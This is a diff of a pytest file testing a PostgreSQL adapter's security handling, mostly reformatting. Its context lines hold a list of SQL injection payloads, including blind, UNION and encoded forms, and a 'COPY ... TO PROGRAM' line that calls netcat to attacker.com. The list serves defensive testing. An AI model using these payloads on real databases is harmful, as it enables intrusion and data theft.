@@ -78,12 +78,16 @@ class TestPostgresAdapterSecurityEdgeCases:
         )
 
     @pytest.fixture
-    def adapter_with_secure_config(self, container, mock_connection_manager, secure_config):
+    def adapter_with_secure_config(
+        self, container, mock_connection_manager, secure_config,
+    ):
         """Create adapter with secure production configuration."""
         mock_container = Mock(spec=ModelONEXContainer)
         mock_container.get_service.return_value = mock_connection_manager
 
-        with patch("omnibase_infra.infrastructure.postgres_connection_manager.PostgresConnectionManager") as mock_manager_class:
+        with patch(
+            "omnibase_infra.infrastructure.postgres_connection_manager.PostgresConnectionManager",
+        ) as mock_manager_class:
             mock_manager_class.return_value = mock_connection_manager
 
             adapter = NodePostgresAdapterEffect(mock_container)
@@ -133,31 +137,22 @@ class TestPostgresAdapterSecurityEdgeCases:
         advanced_injection_patterns = [
             # Time-based blind SQL injection
             "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END; --",
-
             # Boolean-based blind injection
             "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1",
-
             # Union-based information extraction
             "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='public'--",
-
             # Function-based attacks
             "'; SELECT current_user, version(), database(); --",
-
             # Nested query attacks
             "'; SELECT * FROM users WHERE id IN (SELECT admin_id FROM admin_users); --",
-
             # Comment-based attacks
             "admin'/**/OR/**/1=1/**/--",
-
             # Encoded attacks
             "%27%20OR%201=1--",
-
             # PostgreSQL-specific attacks
             "'; COPY users TO PROGRAM 'nc attacker.com 4444'; --",
-
             # Buffer overflow attempts
             "'" + "A" * 10000 + "'",
-
             # XML/JSON injection
             "'; SELECT xmlparse(content '<?xml version=\"1.0\"?><root>test</root>'); --",
         ]
@@ -267,7 +262,9 @@ class TestPostgresAdapterSecurityEdgeCases:
             await asyncio.sleep(0.01)  # Consistent 10ms delay
             return [{"result": "success"}]
 
-        adapter_with_secure_config._connection_manager.execute_query.side_effect = mock_execute_with_timing
+        adapter_with_secure_config._connection_manager.execute_query.side_effect = (
+            mock_execute_with_timing
+        )
 
         queries = [
             "SELECT * FROM users WHERE username = 'admin'",
@@ -333,7 +330,9 @@ class TestPostgresAdapterSecurityEdgeCases:
         """Test memory management with large queries and results."""
 
         # Test large query size validation
-        large_query = "SELECT * FROM huge_table WHERE " + " OR ".join([f"id = {i}" for i in range(10000)])
+        large_query = "SELECT * FROM huge_table WHERE " + " OR ".join(
+            [f"id = {i}" for i in range(10000)],
+        )
 
         correlation_id = uuid.uuid4()
         query_request = ModelPostgresQueryRequest(
@@ -360,25 +359,33 @@ class TestPostgresAdapterSecurityEdgeCases:
         """Test secure configuration loading without exposing sensitive data."""
 
         # Test secure mode prevents logging of configuration values
-        with patch.dict("os.environ", {
-            "POSTGRES_ADAPTER_MAX_QUERY_SIZE": "30000",
-            "POSTGRES_ADAPTER_ENVIRONMENT": "production",
-        }):
+        with patch.dict(
+            "os.environ",
+            {
+                "POSTGRES_ADAPTER_MAX_QUERY_SIZE": "30000",
+                "POSTGRES_ADAPTER_ENVIRONMENT": "production",
+            },
+        ):
             config = ModelPostgresAdapterConfig.from_environment(secure_mode=True)
             assert config.max_query_size == 30000
             assert config.environment == "production"
 
         # Test configuration validation errors don't expose internal details
-        with patch.dict("os.environ", {
-            "POSTGRES_ADAPTER_MAX_QUERY_SIZE": "invalid_number",
-        }):
+        with patch.dict(
+            "os.environ",
+            {
+                "POSTGRES_ADAPTER_MAX_QUERY_SIZE": "invalid_number",
+            },
+        ):
             try:
                 config = ModelPostgresAdapterConfig.from_environment(secure_mode=True)
             except OnexError as e:
                 assert "Failed to load PostgreSQL adapter configuration" in str(e)
 
     @pytest.mark.asyncio
-    async def test_error_message_information_disclosure_prevention(self, adapter_with_secure_config):
+    async def test_error_message_information_disclosure_prevention(
+        self, adapter_with_secure_config,
+    ):
         """Test prevention of information disclosure through error messages."""
 
         # Mock database errors that might contain sensitive information
@@ -393,7 +400,9 @@ class TestPostgresAdapterSecurityEdgeCases:
         correlation_id = uuid.uuid4()
 
         for sensitive_error in sensitive_errors:
-            adapter_with_secure_config._connection_manager.execute_query.side_effect = Exception(sensitive_error)
+            adapter_with_secure_config._connection_manager.execute_query.side_effect = (
+                Exception(sensitive_error)
+            )
 
             query_request = ModelPostgresQueryRequest(
                 query="SELECT 1",
